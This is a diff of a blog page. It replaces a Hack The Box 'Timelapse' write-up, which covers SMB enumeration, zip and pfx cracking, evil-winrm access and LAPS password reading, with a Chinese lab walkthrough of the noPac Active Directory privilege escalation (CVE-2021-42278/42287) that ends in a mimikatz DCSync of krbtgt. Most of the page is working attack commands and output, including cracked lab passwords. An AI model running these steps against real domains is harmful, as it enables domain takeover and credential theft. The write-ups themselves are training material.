@@ -4,10 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Timelapse, Zh0um1&#39;s Blog">
-    <meta name="description" content="ForewordThere is no Chinese input method in kali, please forgive my English level
-Enumerationnmap┌──(root💀kali)-[~]
-   ">
+    <meta name="keywords" content="Zh0um1&#39;s Blog">
+    <meta name="description" content="原理CVE-2021-42278，机器用户应当是 COMUPTER$ 的形式，但是实际并没有验证机器账号是否有 $。导致机器用户名可以被模拟冒用
+CVE-2021-42287，使用 COMPUTER 的 TGT 通过另一个用户去请求 COM">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +18,7 @@ Enumerationnmap┌──(root💀kali)-[~]
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Timelapse | Zh0um1&#39;s Blog</title>
+    <title>Zh0um1&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -204,12 +203,12 @@ Enumerationnmap┌──(root💀kali)-[~]
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Timelapse</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -323,16 +322,21 @@ Enumerationnmap┌──(root💀kali)-[~]
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/HTB/">
-                                <span class="chip bg-color">HTB</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%86%85%E7%BD%91/" class="post-category">
+                                内网
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -341,7 +345,7 @@ Enumerationnmap┌──(root💀kali)-[~]
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-04-08
+                    2022-09-10
                 </div>
                 
 
@@ -365,215 +369,106 @@ Enumerationnmap┌──(root💀kali)-[~]
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h1><p>There is no Chinese input method in kali, please forgive my English level</p>
-<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><pre class="language-none"><code class="language-none">┌──(root💀kali)-[~]
-    └─# nmap -sC -sV -T4 10.10.11.152                                                                                                                        1 ⚙
-Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-08 16:17 CST
-Nmap scan report for 10.10.11.152
-Host is up (0.58s latency).
-Not shown: 989 filtered tcp ports (no-response)
-PORT     STATE SERVICE       VERSION
-53&#x2F;tcp   open  domain        Simple DNS Plus
-88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-08 16:19:48Z)
-135&#x2F;tcp  open  msrpc         Microsoft Windows RPC
-139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
-445&#x2F;tcp  open  microsoft-ds?
-464&#x2F;tcp  open  kpasswd5?
-593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636&#x2F;tcp  open  tcpwrapped
-3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
-3269&#x2F;tcp open  tcpwrapped
-Service Info: Host: DC01; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows
-
-Host script results:
-|_clock-skew: 8h01m34s
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled and required
-| smb2-time: 
-|   date: 2022-04-08T16:20:31
-|_  start_date: N&#x2F;A
-
-Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
-Nmap done: 1 IP address (1 host up) scanned in 135.90 seconds</code></pre>
-
-<p>Add domain <code>timelapse.htb</code> to <code>etc/hosts</code></p>
-<h2 id="Out-of-domain-username-enumeration"><a href="#Out-of-domain-username-enumeration" class="headerlink" title="Out-of-domain username enumeration"></a>Out-of-domain username enumeration</h2><pre class="language-none"><code class="language-none">┌──(root💀kali)-[&#x2F;opt&#x2F;tools&#x2F;domain_tools]
-└─# .&#x2F;kerbrute userenum -d timelapse.htb &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;top-usernames-shortlist.txt --dc 10.10.11.152                                     1 ⚙
-
-    __             __               __     
-   &#x2F; &#x2F;_____  _____&#x2F; &#x2F;_  _______  __&#x2F; &#x2F;____ 
-  &#x2F; &#x2F;&#x2F;_&#x2F; _ \&#x2F; ___&#x2F; __ \&#x2F; ___&#x2F; &#x2F; &#x2F; &#x2F; __&#x2F; _ \
- &#x2F; ,&lt; &#x2F;  __&#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;_&#x2F;  __&#x2F;
-&#x2F;_&#x2F;|_|\___&#x2F;_&#x2F;  &#x2F;_.___&#x2F;_&#x2F;   \__,_&#x2F;\__&#x2F;\___&#x2F;                                        
-
-Version: v1.0.3 (9dad6e1) - 04&#x2F;08&#x2F;22 - Ronnie Flathers @ropnop
-
-2022&#x2F;04&#x2F;08 16:50:09 &gt;  Using KDC(s):
-2022&#x2F;04&#x2F;08 16:50:09 &gt;   10.10.11.152:88
-
-2022&#x2F;04&#x2F;08 16:50:10 &gt;  [+] VALID USERNAME:       guest@timelapse.htb
-2022&#x2F;04&#x2F;08 16:50:10 &gt;  [+] VALID USERNAME:       administrator@timelapse.htb
-2022&#x2F;04&#x2F;08 16:50:11 &gt;  Done! Tested 17 usernames (2 valid) in 1.377 seconds</code></pre>
-
-<h2 id="smbmap"><a href="#smbmap" class="headerlink" title="smbmap"></a>smbmap</h2><pre class="language-none"><code class="language-none">┌──(kali㉿kali)-[~]
-└─$ smbmap -H 10.10.11.152 -u guest
-[+] IP: 10.10.11.152:445        Name: timelapse.htb                                     
-        Disk                                                    Permissions     Comment
-        ----                                                    -----------     -------
-        ADMIN$                                                  NO ACCESS       Remote Admin
-        C$                                                      NO ACCESS       Default share
-        IPC$                                                    READ ONLY       Remote IPC
-        NETLOGON                                                NO ACCESS       Logon server share 
-        Shares                                                  READ ONLY
-        SYSVOL                                                  NO ACCESS       Logon server share</code></pre>
-
-<p>using the smbmap can found <code>Shares</code> have read privilege</p>
-<p>try to login with guest by smbclient, there have a backup zip file</p>
-<pre class="language-none"><code class="language-none">┌──(root💀kali)-[&#x2F;opt&#x2F;tools&#x2F;domain_tools]
-└─# smbclient -U guest -W timelapse.htb &#x2F;&#x2F;timelapse.htb&#x2F;Shares                                                                                     130 ⨯ 1 ⚙
-Enter TIMELAPSE.HTB\guest&#39;s password: 
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt; ls
-  .                                   D        0  Mon Oct 25 23:39:15 2021
-  ..                                  D        0  Mon Oct 25 23:39:15 2021
-  Dev                                 D        0  Tue Oct 26 03:40:06 2021
-  HelpDesk                            D        0  Mon Oct 25 23:48:42 2021
-
-                6367231 blocks of size 4096. 1382234 blocks available
-smb: \&gt; cd dev
-smb: \dev\&gt; ls
-  .                                   D        0  Tue Oct 26 03:40:06 2021
-  ..                                  D        0  Tue Oct 26 03:40:06 2021
-  winrm_backup.zip                    A     2611  Mon Oct 25 23:46:42 2021
-
-                6367231 blocks of size 4096. 1382218 blocks available</code></pre>
-
-<p>get it!</p>
-<h2 id="Brute-password"><a href="#Brute-password" class="headerlink" title="Brute password"></a>Brute password</h2><p>unzip the backup file need password</p>
-<p>so, I should find the password at first</p>
-<pre class="language-none"><code class="language-none">┌──(kali㉿kali)-[~]
-└─$ zip2john winrm_backup.zip &gt; hash.txt
-                   
-┌──(kali㉿kali)-[~]
-└─$ john hash.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 
-Using default input encoding: UTF-8
-Loaded 1 password hash (PKZIP [32&#x2F;64])
-Will run 4 OpenMP threads
-Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
-supremelegacy    (winrm_backup.zip&#x2F;legacyy_dev_auth.pfx)     
-1g 0:00:00:00 DONE (2022-04-08 17:54) 3.846g&#x2F;s 13359Kp&#x2F;s 13359Kc&#x2F;s 13359KC&#x2F;s surki..superkeep16
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
-Session completed</code></pre>
-
-<p>get password <code>supremelegacy</code></p>
-<p>unzip the to get <code>legacyy_dev_auth.pfx</code> file. This file also should password to open, using john too</p>
-<pre class="language-none"><code class="language-none">python pfx2john.py ~&#x2F;legacyy_dev_auth.pfx &gt; ~&#x2F;pfx_hash.txt
-
-john pfx_hash.txt --format&#x3D;pfx --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</code></pre>
-
-<p>get password: <code>thuglegacy</code></p>
-<p>unlock the pfx file, I found a file named <code>Legacyy</code> in it, and the name is a vaild username in kerberos</p>
-<pre class="language-none"><code class="language-none">    __             __               __     
-   &#x2F; &#x2F;_____  _____&#x2F; &#x2F;_  _______  __&#x2F; &#x2F;____ 
-  &#x2F; &#x2F;&#x2F;_&#x2F; _ \&#x2F; ___&#x2F; __ \&#x2F; ___&#x2F; &#x2F; &#x2F; &#x2F; __&#x2F; _ \
- &#x2F; ,&lt; &#x2F;  __&#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;_&#x2F;  __&#x2F;
-&#x2F;_&#x2F;|_|\___&#x2F;_&#x2F;  &#x2F;_.___&#x2F;_&#x2F;   \__,_&#x2F;\__&#x2F;\___&#x2F;                                        
-
-Version: v1.0.3 (9dad6e1) - 04&#x2F;08&#x2F;22 - Ronnie Flathers @ropnop
-
-2022&#x2F;04&#x2F;08 18:49:18 &gt;  Using KDC(s):
-2022&#x2F;04&#x2F;08 18:49:18 &gt;   10.10.11.152:88
-
-2022&#x2F;04&#x2F;08 18:49:18 &gt;  [+] VALID USERNAME:       Legacyy@timelapse.htb
-2022&#x2F;04&#x2F;08 18:49:18 &gt;  Done! Tested 1 usernames (1 valid) in 0.320 seconds</code></pre>
-
-<h1 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h1><p>I try to brute legacyy’s password by kerbrute, but fail</p>
-<p>so, let back to where we started. We found a backup file, which name is <code>winrm_backup.zip</code>. Unzip the compressed file, We get the <code>legacyy_dev_auth.pfx</code></p>
-<p>Maybe the winrm is a component or service in windows. I try to search it in google and I get the explain by Microsoft.</p>
+                <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>CVE-2021-42278，机器用户应当是 <code>COMUPTER$</code> 的形式，但是实际并没有验证机器账号是否有 <code>$</code>。导致机器用户名可以被模拟冒用</p>
+<p>CVE-2021-42287，使用 COMPUTER 的 TGT 通过另一个用户去请求 COMPUTER 自己的 ST 时，将 TGT 发送给 KDC 后，当 KDC 找不到 COMPUTER 时，KDC 会再次寻找 <code>computer$</code> 的 ST，从而获得了 <code>computer$</code> 的 ST。从而获得了 <code>computer$</code> 的权限</p>
+<p>利用条件：需要对属性 <code>sAMAccountName</code> and <code>servicePrincipalName</code> 有<strong>写权限</strong></p>
+<p>可以利用域内默认的 MAQ 特性，默认允许域账户创建 10 个机器账户，而创建者对于机器账户具有写权限</p>
 <blockquote>
-<p>Windows Remote Management (WinRM) is the Microsoft implementation of WS-Management Protocol, a standard Simple Object Access Protocol (SOAP)-based, firewall-friendly protocol that allows hardware and operating systems, from different vendors, to interoperate.</p>
+<p>查看 MAQ 是否有限制，查看 LDAP 中的 ms-ds-machineaccountquota 属性</p>
 </blockquote>
-<p>I consider the winrm is similar to SSH. So the credentials are also required.</p>
-<p>As we all know, the pfx file usually contains the X.509 certificate and private key, and the <code>legacyy_dev_auth.pfx</code> we haven’t use yet. So I think the pfx can be used for authentication in winrm. Let’s separate the private key and X.509 certficate from the pfx file.</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out Legacyy.pem
+<p>攻击流程：</p>
+<ol>
+<li><p>创建一个机器账户，这在之前的文章都有所提及，使用 impacket 的 <code>addcomputer.py</code> 或是 <code>powermad</code>。<code>addcomputer.py</code> 是利用 <code>SAMR 协议 </code> 创建机器账户，这个方法所创建的机器账户没有 SPN，所以可以不用清除</p>
+</li>
+<li><p>清除机器账户的 <code>servicePrincipalName</code> 属性</p>
+</li>
+<li><p>将机器账户的 <code>sAMAccountName</code>，更改为 DC 的机器账户名字，注意后缀不带$</p>
+</li>
+<li><p>为机器账户请求 TGT</p>
+</li>
+<li><p>将机器账户的 <code>sAMAccountName</code> 更改为其他名字，不与步骤 3 重复即可</p>
+</li>
+<li><p>通过 S4U2self 协议向 DC 请求 ST</p>
+</li>
+<li><p>DCsync</p>
+</li>
+</ol>
+<p>示例</p>
+<p>假如域内有一台域控名为 DC（域控对应的机器用户为 <code>DC$</code>），此时攻击者利用漏洞 CVE-2021-42287 创建一个机器用户 <code>SAMTHEADMIN-48$</code>，再把机器用户 <code>SAMTHEADMIN-48$</code> 的 <code>sAMAccountName</code> 改成 <code>DC</code></p>
+<p>然后利用 <code>DC</code> 去申请一个 TGT 票据。再把 <code>DC</code> 的 <code>sAMAccountName</code> 改为 <code>SAMTHEADMIN-48$</code>。这个时候 KDC 就会判断域内没有 <code>DC</code> 这个用户，自动去搜索 <code>DC$</code>（<code>DC$</code> 是域内已经的域控 DC 的 <code>sAMAccountName</code>），攻击者利用刚刚申请的 TGT 进行 S4U2self，模拟域内的域管去请求域控 DC 的 ST 票据，最终获得域控制器 DC 的权限</p>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="检测漏洞是否存在"><a href="#检测漏洞是否存在" class="headerlink" title="检测漏洞是否存在"></a>检测漏洞是否存在</h2><p>这里利用 <a target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a> 中的 scaner.py 来检测</p>
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910171113.png">&#x2F;Pasted image 20220910171113.png)</p>
+<p>可以看到可以请求不包含 PAC 的 TGT，所以该域控可以被攻击</p>
+<h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><p>这里使用 了 <code>powermad</code> 和 <code>PowerView</code> 脚本</p>
+<p>创建机器账户</p>
+<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$password</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token string">'1qaz2wsx'</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force
+<span class="token function">New-MachineAccount</span> <span class="token operator">-</span>MachineAccount <span class="token string">"NewEvilMachine"</span> <span class="token operator">-</span>Password $<span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">-</span>Domain <span class="token string">"merak.local"</span> <span class="token operator">-</span>DomainController <span class="token string">"DC.merak.local"</span> <span class="token operator">-</span>Verbose</code></pre>
 
-openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out cert.key -nodes</code></pre>
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910175306.png">&#x2F;Pasted image 20220910175306.png)</p>
+<p>清除新建机器账户的 SPN</p>
+<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-DomainObject</span> <span class="token string">"CN=NewEvilMachine,CN=Computers,DC=merak,DC=local"</span> <span class="token operator">-</span>Clear <span class="token string">'serviceprincipalname'</span> <span class="token operator">-</span>Verbose</code></pre>
 
-<p>Now, the problem is how to connect windows by winrm in linux (kali). I found a tool named <code>evil-winrm</code> in <a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">github</a>, which can connect to remote computer by winrm and use certificates for Authentication. Installation is simple in kali: <code>sudo apt-get install evil-winrm</code></p>
-<p>Let’s connect!</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
-└─$ evil-winrm -i <span class="token number">10.10</span>.11.152 -S -c Legacyy.pem -k cert.key 
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910202352.png">&#x2F;Pasted image 20220910202352.png)</p>
+<p>修改机器账户的用户名为域控的用户名，注意不带 <code>$</code></p>
+<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-MachineAccountAttribute</span> <span class="token operator">-</span>MachineAccount <span class="token string">"NewEvilMachine"</span> <span class="token operator">-</span>Value <span class="token string">"DC"</span> <span class="token operator">-</span>Attribute samaccountname <span class="token operator">-</span>Verbose</code></pre>
 
-Evil-WinRM shell v3.3
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910203110.png">&#x2F;Pasted image 20220910203110.png)</p>
+<p>请求 TGT</p>
+<pre class="language-bashDC" data-language="bashDC"><code class="language-bashDC">Rubeus.exe asktgt &#x2F;user:&quot;DC&quot; &#x2F;password:&quot;1qaz2wsx&quot; &#x2F;domain:&quot;merak.local&quot; &#x2F;dc:&quot;DC.merak.local&quot; &#x2F;nowrap</code></pre>
 
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910210604.png">&#x2F;Pasted image 20220910210604.png)</p>
+<p>恢复机器账户原用户名</p>
+<pre class="language-powershwll" data-language="powershwll"><code class="language-powershwll">Set-MachineAccountAttribute -MachineAccount &quot;NewEvilMachine&quot; -Value &quot;NewEvilMachine&quot; -Attribute samaccountname -Verbose</code></pre>
 
-Data: For <span class="token function">more</span> information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910212231.png">&#x2F;Pasted image 20220910212231.png)</p>
+<p>使用请求的 TGT 通过 S4U2self 获取 ST</p>
+<pre class="language-powershell" data-language="powershell"><code class="language-powershell">Rubeus<span class="token punctuation">.</span>exe s4u <span class="token operator">/</span>self <span class="token operator">/</span>impersonateuser:<span class="token string">"administrator"</span> <span class="token operator">/</span>altservice:<span class="token string">"ldap/DC.merak.local"</span> <span class="token operator">/</span>dc:<span class="token string">"DC.merak.local"</span> <span class="token operator">/</span>ptt <span class="token operator">/</span>ticket:<span class="token namespace">[Base64 TGT]</span></code></pre>
 
-Warning: SSL enabled
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910212825.png">&#x2F;Pasted image 20220910212825.png)</p>
+<p>验证</p>
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910213055.png">&#x2F;Pasted image 20220910213055.png)</p>
+<p>DCSync</p>
+<pre class="language-powershell" data-language="powershell"><code class="language-powershell">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"lsadump::dcsync /domain:merak.local /kdc:DC.merak.local /user:krbtgt"</span> <span class="token string">"exit"</span></code></pre>
 
-Info: Establishing connection to remote endpoint
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910213342.png">&#x2F;Pasted image 20220910213342.png)</p>
+<h2 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h2><p>创建机器账户</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python addcomputer.py -dc-ip <span class="token number">10.0</span>.100.10 -computer-name <span class="token string">'ImpacketEvilMachine$'</span> -computer-pass <span class="token string">'1qaz2wsx'</span> -dc-host DC -domain-netbios DC <span class="token string">'merak.local/xzz:Password123'</span></code></pre>
 
-*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>legacyy<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
-timelapse<span class="token punctuation">\</span>legacyy</code></pre>
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910214341.png">&#x2F;Pasted image 20220910214341.png)</p>
+<p>清除 SPN</p>
+<p>addspn.py 出自 <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx">https://github.com/dirkjanm/krbrelayx</a></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python addspn.py -u <span class="token string">'merak\xzz'</span> -p <span class="token string">'Password123'</span> -t <span class="token string">'ImpacketEvilMachine$'</span> -c DC.merak.local</code></pre>
 
-<p>get user flag in <code>c:\users\legacyy\desktop\user.txt</code></p>
-<h1 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h1><p>After a long and futile enumeration, Prompted by <code>pyp</code> in <a target="_blank" rel="noopener" href="https://forum.hackthebox.com/t/official-timelapse-discussion/254385/4?u=k0to">forum</a> and this <a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html">blog</a>, I found the powershell history file</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>legacyy<span class="token punctuation">\</span>appdata<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>PowerShell<span class="token punctuation">\</span>PSReadLine<span class="token operator">></span> <span class="token builtin class-name">type</span> ConsoleHost_history.txt
-<span class="token function">whoami</span>
-ipconfig /all
-<span class="token function">netstat</span> -ano <span class="token operator">|</span>select-string LIST
-<span class="token variable">$so</span> <span class="token operator">=</span> New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
-<span class="token variable">$p</span> <span class="token operator">=</span> ConvertTo-SecureString <span class="token string">'E3R$Q62^12p7PLlC%KWaxuaV'</span> -AsPlainText -Force
-<span class="token variable">$c</span> <span class="token operator">=</span> New-Object System.Management.Automation.PSCredential <span class="token punctuation">(</span><span class="token string">'svc_deploy'</span>, <span class="token variable">$p</span><span class="token punctuation">)</span>
-invoke-command -computername localhost -credential <span class="token variable">$c</span> -port <span class="token number">5986</span> -usessl -SessionOption <span class="token variable">$so</span> -scriptblock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span>
-get-aduser -filter * -properties *
-<span class="token builtin class-name">exit</span></code></pre>
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910215313.png">&#x2F;Pasted image 20220910215313.png)</p>
+<p>修改机器账户用户名</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ShutdownRepo/impacket/blob/CVE-2021-42278/examples/renameMachine.py">https://github.com/ShutdownRepo/impacket/blob/CVE-2021-42278/examples/renameMachine.py</a></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python renameMachine.py -current-name <span class="token string">'ImpacketEvilMachine$'</span> -new-name <span class="token string">'DC'</span> -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/xzz:Password123'</span></code></pre>
 
-<p>WOW, there have svc_deploy’s credentials. following the history commands, we can execute commands as svc_deploy user</p>
-<pre class="language-none"><code class="language-none">GROUP INFORMATION
------------------
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910220735.png">&#x2F;Pasted image 20220910220735.png)</p>
+<p>请求 TGT</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python getTGT.py -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/DC:1qaz2wsx'</span></code></pre>
 
-Group Name                                  Type             SID                                          Attributes
-&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
-BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
-TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
-Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
-Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</code></pre>
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910223444.png">&#x2F;Pasted image 20220910223444.png)</p>
+<p>恢复机器账户用户名</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python renameMachine.py -current-name <span class="token string">'DC'</span> -new-name <span class="token string">'ImpacketEvilMachine$'</span> -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/xzz:Password123'</span></code></pre>
 
-<p>The svc_deploy user is a member of the<code>LAPS_Readers</code> group. After some googling, I found that <code>LAPS_Readers</code> group members can read the password of the administrator user</p>
-<pre class="language-none"><code class="language-none">invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock &#123;Get-ADComputer -Identity dc01 -properties * | findstr ms-Mcs-AdmPwd&#125;</code></pre>
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910221237.png">&#x2F;Pasted image 20220910221237.png)</p>
+<p>使用请求的 TGT 通过 S4U2self 获取 ST</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span><span class="token string">'DC.ccache'</span>
+python getST.py -impersonate <span class="token string">'administrator'</span> -spn <span class="token string">'cifs/DC.merak.local'</span> -k -no-pass -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/DC'</span></code></pre>
 
-<p>I got the password of administrator!</p>
-<pre class="language-none"><code class="language-none">ms-Mcs-AdmPwd                        : )Vls1+OD0%8WlDdJ6Q)G!4)-
-ms-Mcs-AdmPwdExpirationTime          : 132943373149524209</code></pre>
+<p>失败，原因暂未可知</p>
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220911110934.png">&#x2F;Pasted image 20220911110934.png)</p>
+<p>附一个成功的截图</p>
